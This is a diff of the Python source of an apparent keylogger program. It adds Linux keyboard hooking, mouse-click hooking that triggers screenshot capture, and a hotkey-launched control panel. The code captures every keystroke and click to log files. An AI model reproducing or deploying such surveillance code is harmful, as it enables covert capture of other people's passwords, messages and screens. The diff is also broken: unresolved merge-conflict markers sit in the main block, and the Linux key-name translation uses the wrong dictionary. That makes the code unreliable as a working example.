@@ -20,15 +20,25 @@
 ##
 ##############################################################################
 
-import pyHook
-import time
-import pythoncom
-import sys
 import os
-import imp # don't need this anymore?
+import os.path
+import time
+import sys
+if os.name == 'posix':
+    import pyxhook as hooklib
+elif os.name == 'nt':
+    import pyHook as hooklib
+    import pythoncom
+else:
+    print "OS is not recognised as windows or linux."
+    exit()
+
+#import imp # don't need this anymore?
+import re
 from optparse import OptionParser
 import traceback
 from logwriter import LogWriter
+from imagecapture import ImageWriter
 import version
 #import ConfigParser
 from configobj import ConfigObj
@@ -38,6 +48,7 @@ from supportscreen import SupportScreen, ExpirationScreen
 import Tkinter, tkMessageBox
 import myutils
 import Queue
+import threading
 
 class KeyLogger:
     ''' Captures all keystrokes, puts events in Queue for later processing
@@ -45,85 +56,116 @@ class KeyLogger:
     '''
     def __init__(self): 
         
-        self.ParseOptions()
-        self.ParseConfigFile()
+        self.ParseOptions() # stored in self.cmdoptions
+        self.ParseConfigFile() # stored in self.settings
         self.ParseControlKey()
         self.NagscreenLogic()
-        self.q = Queue.Queue(0)
-        self.hm = pyHook.HookManager()
-        self.hm.KeyDown = self.OnKeyDownEvent
-        self.hm.KeyUp = self.OnKeyUpEvent
+        self.process_settings()
+        self.q_logwriter = Queue.Queue(0)
+        self.q_imagewriter = Queue.Queue(0)
+        self.lw = LogWriter(self.settings, self.cmdoptions, self.q_logwriter)
+        self.iw = ImageWriter(self.settings, self.cmdoptions, self.q_imagewriter)
+        if os.name == 'posix':
+            self.hashchecker = ControlKeyMonitor(self.cmdoptions, self.lw, self, self.ControlKeyHash)
+        
+        self.hm = hooklib.HookManager()
         
         if self.settings['General']['Hook Keyboard'] == True:
             self.hm.HookKeyboard()
-        #if self.options.hookMouse == True:
-        #    self.hm.HookMouse()
+            self.hm.KeyDown = self.OnKeyDownEvent
+            self.hm.KeyUp = self.OnKeyUpEvent
         
-        self.lw = LogWriter(self.settings, self.cmdoptions, self.q) 
+        if self.settings['Image Capture']['Capture Clicks'] == True:
+            self.hm.HookMouse()
+            self.hm.MouseAllButtonsDown = self.OnMouseDownEvent
+        
+        #if os.name == 'nt':
         self.panel = False
+        
+        #if self.options.hookMouse == True:
+        #   self.hm.HookMouse()
 
     def start(self):
         self.lw.start()
-        pythoncom.PumpMessages()
-    
+        self.iw.start()
+        if os.name == 'nt':
+            pythoncom.PumpMessages()
+        if os.name == 'posix':
+            self.hashchecker.start()
+            self.hm.start()
+        
+    def process_settings(self):
+        '''Process some settings values to correct for user input errors, 
+        and to detect proper full path of the log directory.
+        
+        We can change things in the settings configobj with impunity here,
+        since the control panel process get a fresh read of settings from file
+        before doing anything.
+        '''
+        
+        if os.path.isabs(self.settings['General']['Log Directory']):
+            self.settings['General']['Log Directory'] = os.path.normpath(self.settings['General']['Log Directory'])
+        else:
+            self.settings['General']['Log Directory'] = os.path.join(myutils.get_main_dir(), os.path.normpath(self.settings['General']['Log Directory']))
+        
+        self.filter = re.compile(r"[\\\/\:\*\?\"\<\>\|]+")    #regexp filter for the non-allowed characters in windows filenames.
+        self.settings['General']['Log File'] = self.filter.sub(r'__',self.settings['General']['Log File'])
+        self.settings['General']['System Log'] = self.filter.sub(r'__',self.settings['General']['System Log'])
+        
+        # todo: also want to run imagesdirectoryname (tbc) through self.filter 
+        
     def ParseControlKey(self):
-        #~ self.controlKeyList = self.settings['General']['Control Key'].split(';')
-        #~ self.controlKeyList = [item.capitalize() for item in self.controlKeyList]
-        #~ self.controlKeyHash = dict(zip(self.controlKeyList, [False for item in self.controlKeyList]))
         self.ControlKeyHash = ControlKeyHash(self.settings['General']['Control Key'])
         
-    #~ def MaintainControlKeyHash(self, event, updown):
-        #~ if updown == 'Down' and event.Key in self.controlKeyHash.keys():
-            #~ self.controlKeyHash[event.Key] = True
-        #~ if updown == 'Up' and event.Key in self.controlKeyHash.keys():
-            #~ self.controlKeyHash[event.Key] = False
-
-    #~ def CheckForControlEvent(self):
-        #~ if self.cmdoptions.debug:
-            #~ self.lw.PrintDebug("control key status: " + str(self.controlKeyHash))
-        #~ if self.controlKeyHash.values() == [True for item in self.controlKeyHash.keys()]:
-            #~ return True
-        #~ else:
-            #~ return False
-
     def OnKeyDownEvent(self, event):
         '''This function is the stuff that's supposed to happen when a key is pressed.
-        Puts the event in queue, and passes it on.
-        Starts control panel if proper key is pressed.
+        Puts the event in queue, 
+        Updates the control key combo status,
+        And passes the event on to the system.
         '''
-        #self.lw.WriteToLogFile(event)
-        self.q.put(event)
         
-        #self.MaintainControlKeyHash(event, 'Down')
+        self.q_logwriter.put(event)
+        
         self.ControlKeyHash.update(event)
         
-        #~ if self.CheckForControlEvent():
         if self.cmdoptions.debug:
                 self.lw.PrintDebug("control key status: " + str(self.ControlKeyHash))
-        if self.ControlKeyHash.check():
-            if not self.panel:
-                self.lw.PrintDebug("starting panel")
-                self.panel = True
-                self.ControlKeyHash.reset()
-                PyKeyloggerControlPanel(self.cmdoptions, self)
-
-        #~ if event.Key == self.settings['General']['Control Key']:
-            #~ if not self.panel:
-                #~ self.lw.PrintDebug("starting panel\n")
-                #~ self.panel = True
-                #~ PyKeyloggerControlPanel(self.cmdoptions, self)
-            
+                
+        # have to open the panel from main thread on windows, otherwise it hangs.
+        # possibly due to some interaction with the python message pump and tkinter?
+        # 
+        # on linux, on the other hand, doing it from a separate worker thread is a must
+        # since the pyxhook module blocks until panel is closed, so we do it with the 
+        # hashchecker thread instead.
+        if os.name == 'nt': 
+            if self.ControlKeyHash.check():
+                if not self.panel:
+                    self.lw.PrintDebug("starting panel")
+                    self.panel = True
+                    self.ControlKeyHash.reset()
+                    PyKeyloggerControlPanel(self.cmdoptions, self)
+        
         return True
     
     def OnKeyUpEvent(self,event):
-        #self.MaintainControlKeyHash(event, 'Up')
         self.ControlKeyHash.update(event)
+        return True
+    
+    def OnMouseDownEvent(self,event):
+        self.q_imagewriter.put(event)
         return True
     
     def stop(self):
         '''Exit cleanly.
         '''
+        
+        if os.name == 'posix':
+            self.hm.cancel()
+            self.hashchecker.cancel()
         self.lw.cancel()
+        self.iw.cancel()
+        
+        #print threading.enumerate()
         sys.exit()
     
     def ParseOptions(self):
@@ -147,7 +189,12 @@ class KeyLogger:
         
         Give detailed error box and exit if validation on the config file fails.
         '''
-
+        
+        if not os.path.isabs(self.cmdoptions.configfile):
+            self.cmdoptions.configfile = os.path.join(myutils.get_main_dir(), self.cmdoptions.configfile)
+        if not os.path.isabs(self.cmdoptions.configval):
+            self.cmdoptions.configval = os.path.join(myutils.get_main_dir(), self.cmdoptions.configval)
+            
         self.settings=ConfigObj(self.cmdoptions.configfile, configspec=self.cmdoptions.configval, list_values=False)
 
         # validate the config file
@@ -200,17 +247,57 @@ class KeyLogger:
                 sys.exit()
 
 class ControlKeyHash:
+    '''Encapsulates the control key dictionary which is used to keep
+    track of whether the control key combo has been pressed.
+    '''
     def __init__(self, controlkeysetting):
+        
+        #~ lin_win_dict = {'Alt_L':'Lmenu',
+                                    #~ 'Alt_R':'Rmenu',
+                                    #~ 'Control_L':'Lcontrol',
+                                    #~ 'Control_R':'Rcontrol',
+                                    #~ 'Shift_L':'Lshift',
+                                    #~ 'Shift_R':'Rshift',
+                                    #~ 'Super_L':'Lwin',
+                                    #~ 'Super_R':'Rwin'}
+        
+        lin_win_dict = {'Alt_l':'Lmenu',
+                                    'Alt_r':'Rmenu',
+                                    'Control_l':'Lcontrol',
+                                    'Control_r':'Rcontrol',
+                                    'Shift_l':'Lshift',
+                                    'Shift_r':'Rshift',
+                                    'Super_l':'Lwin',
+                                    'Super_r':'Rwin',
+                                    'Page_up':'Prior'}
+                                    
+        win_lin_dict = dict([(v,k) for (k,v) in lin_win_dict.iteritems()])
+        
         self.controlKeyList = controlkeysetting.split(';')
+        
+        # capitalize all items for greater tolerance of variant user inputs
+        self.controlKeyList = [item.capitalize() for item in self.controlKeyList]
+        # remove duplicates
+        self.controlKeyList = list(set(self.controlKeyList))
+        
+        # translate linux versions of key names to windows, or vice versa,
+        # depending on what platform we are on.
         if os.name == 'nt':
-            self.controlKeyList = [item.capitalize() for item in self.controlKeyList]
+            for item in self.controlKeyList:
+                if item in lin_win_dict.keys():
+                    self.controlKeyList[self.controlKeyList.index(item)] = lin_win_dict[item]
+        elif os.name == 'posix':
+            for item in self.controlKeyList:
+                if item in win_lin_dict.keys():
+                    self.controlKeyList[self.controlKeyList.index(item)] = lin_win_dict[item]
+        
         self.controlKeyHash = dict(zip(self.controlKeyList, [False for item in self.controlKeyList]))
     
     def update(self, event):
-        if event.MessageName == 'key down' and event.Key in self.controlKeyHash.keys():
-            self.controlKeyHash[event.Key] = True
-        if event.MessageName == 'key up' and event.Key in self.controlKeyHash.keys():
-            self.controlKeyHash[event.Key] = False
+        if event.MessageName == 'key down' and event.Key.capitalize() in self.controlKeyHash.keys():
+            self.controlKeyHash[event.Key.capitalize()] = True
+        if event.MessageName == 'key up' and event.Key.capitalize() in self.controlKeyHash.keys():
+            self.controlKeyHash[event.Key.capitalize()] = False
     
     def reset(self):
         for key in self.controlKeyHash.keys():
@@ -225,10 +312,48 @@ class ControlKeyHash:
     def __str__(self):
         return str(self.controlKeyHash)
 
+class ControlKeyMonitor(threading.Thread):
+    '''Polls the control key hash status periodically, to see if
+    the control key combo has been pressed. Brings up control panel if it has.
+    '''
+    def __init__(self, cmdoptions, logwriter, mainapp, controlkeyhash):
+        threading.Thread.__init__(self)
+        self.finished = threading.Event()
+        
+        # panel flag - true if panel is up, false if not
+        # this way we don't start a second panel instance when it's already up
+        #self.panel=False
+        
+        self.lw = logwriter
+        self.mainapp = mainapp
+        self.cmdoptions = cmdoptions
+        self.ControlKeyHash = controlkeyhash
+        
+    def run(self):
+        while not self.finished.isSet():
+            if self.ControlKeyHash.check():
+                if not self.mainapp.panel:
+                    self.lw.PrintDebug("starting panel")
+                    self.mainapp.panel = True
+                    self.ControlKeyHash.reset()
+                    PyKeyloggerControlPanel(self.cmdoptions, self.mainapp)
+            time.sleep(0.05)
+        
+    def cancel(self):
+        self.finished.set()
+        
+
 if __name__ == '__main__':
     
     kl = KeyLogger()
     kl.start()
     
     #if you want to change keylogger behavior from defaults, modify the .ini file. Also try '-h' for list of command line options.
+    =======
     
+    kl = KeyLogger()
+    kl.start()
+        
+    #if you want to change keylogger behavior from defaults, modify the .ini file. Also try '-h' for list of command line options.
+    
+>>>>>>> 1.29.2.14
